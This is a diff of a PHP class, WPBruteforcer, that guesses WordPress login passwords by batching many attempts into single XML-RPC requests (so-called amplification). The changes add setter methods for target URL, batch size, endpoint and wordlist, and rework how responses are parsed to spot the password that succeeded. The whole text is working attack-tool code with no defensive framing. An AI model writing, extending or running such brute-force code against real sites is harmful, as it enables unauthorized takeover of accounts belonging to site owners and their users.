@@ -23,13 +23,6 @@ class WPBruteforcer
     private $url;
 
     /**
-     * Wordlist path.
-     *
-     * @var string
-     */
-    private $wordlist;
-
-    /**
      * Loaded passwords in trunks.
      *
      * @var array
@@ -91,21 +84,58 @@ class WPBruteforcer
     </methodCall>';
 
     /**
-     * @param string $url      Website URL
-     * @param string $wordlist Wordlist path
-     * @param int    $tries    Login tries per request
-     * @param string $uri      XMLRPC URL URI
+     * Set a URL as target.
+     *
+     * @param string $url
      */
-    public function __construct($url, $wordlist, $tries = null, $uri = nul)
+    public function setUrl($url)
     {
         $this->url = $url;
-        $this->wordlist = $wordlist;
-        if ($tries) {
-            $this->tries = $tries;
+    }
+
+    /**
+     * Set nº of tries per request.
+     *
+     * @param int $tries
+     */
+    public function setTries($tries)
+    {
+        $this->tries = $tries;
+    }
+
+    /**
+     * Set target URI.
+     *
+     * @param string $uri
+     */
+    public function setXmlrpcUri($uri)
+    {
+        $this->xmlrpc_uri = $uri;
+    }
+
+    /**
+     * Loads a wordlist in trunks into the current object,
+     * based on the desired tries per request.
+     */
+    public function setWordlist($wordlist)
+    {
+        unset($this->passwords);
+
+        $lines = file($wordlist);
+
+        $this->passwords = [];
+        $block = 0;
+        $pos = 0;
+        foreach ($lines as $line) {
+            if ($pos >= $this->tries) {
+                $block++;
+                $pos = 0;
+            }
+            $pos++;
+            $this->passwords[$block][] = trim($line);
         }
-        if ($uri) {
-            $this->uri = $uri;
-        }
+
+        unset($lines);
     }
 
     /**
@@ -134,7 +164,6 @@ class WPBruteforcer
 
     /**
      * Bruteforce a user using XMLRPC amplification.
-     * Will load the wordlist file.
      *
      * @param string $username
      *
@@ -142,7 +171,9 @@ class WPBruteforcer
      */
     public function bruteforce($username)
     {
-        $this->loadPasswords();
+        if (!$this->url) {
+            return false;
+        }
 
         // Bruteforce
         foreach ($this->passwords as $trunk) {
@@ -152,6 +183,9 @@ class WPBruteforcer
             if ($password = $this->checkResponse($response, $trunk)) {
                 return $password;
             }
+
+            unset($payload);
+            unset($response);
         }
 
         return false;
@@ -179,44 +213,25 @@ class WPBruteforcer
     /**
      * Looks for a password in a XMLRPC response.
      *
-     * @param array $response
-     * @param array $trunk    Passwords used in the request
+     * @param \SimpleXMLElement $response
+     * @param array             $trunk    Passwords used in the request
      *
      * @return string|bool Password or false
      */
     private function checkResponse($response, $trunk)
     {
         // Check response
-        if (isset($response['params']['param']['value']['array']['data']['value'])) {
-            foreach ($response['params']['param']['value']['array']['data']['value'] as $i => $login) {
-                if (isset($login['array'])) {
+        if (isset($response->params->param->value->array->data)) {
+            $i = 0;
+            foreach ($response->params->param->value->array->data->value as $value) {
+                if (isset($value->array)) {
                     return $trunk[$i];
                 }
+                $i++;
             }
         }
 
         return false;
-    }
-
-    /**
-     * Loads a wordlist in trunks into the current object,
-     * based on the desired tries per request.
-     */
-    private function loadPasswords()
-    {
-        $lines = file($this->wordlist);
-
-        $this->passwords = [];
-        $block = 0;
-        $pos = 0;
-        foreach ($lines as $line) {
-            if ($pos >= $this->tries) {
-                $block++;
-                $pos = 0;
-            }
-            $pos++;
-            $this->passwords[$block][] = trim($line);
-        }
     }
 
     /**
@@ -247,7 +262,7 @@ class WPBruteforcer
     {
         $response = $this->xmlrpcRequest(self::XML_TEST);
 
-        return isset($response['params']['param']['value']['string']) && $response['params']['param']['value']['string'] == 'Hello!';
+        return isset($response->params->param->value->string) && $response->params->param->value->string == 'Hello!';
     }
 
     /**
@@ -271,13 +286,15 @@ class WPBruteforcer
      *
      * @param string $data
      *
-     * @return array|bool Parsed Response or false
+     * @return \SimpleXMLElement|bool Parsed Response or false
      */
     private function xmlrpcRequest($data)
     {
         if ($response = $this->request($this->xmlrpc_uri, $data)) {
-            return json_decode(json_encode((array) $response), 1);
+            return $response;
         }
+
+        return false;
     }
 
     /**
